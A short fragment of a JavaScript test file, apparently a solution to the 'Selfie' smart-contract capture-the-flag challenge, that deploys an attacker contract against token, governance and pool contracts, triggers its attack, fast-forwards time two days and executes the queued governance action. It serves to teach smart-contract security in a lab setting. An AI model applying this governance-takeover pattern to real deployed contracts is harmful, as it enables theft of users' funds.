...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        this.selfieAttacker = await SelfieAttackerFactory.deploy(this.token.address, this.governance.address, this.pool.address);
        selfieAttacker = await this.selfieAttacker.connect(attacker);
        await selfieAttacker.attack();
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
        await this.governance.executeAction(selfieAttacker.actionId());
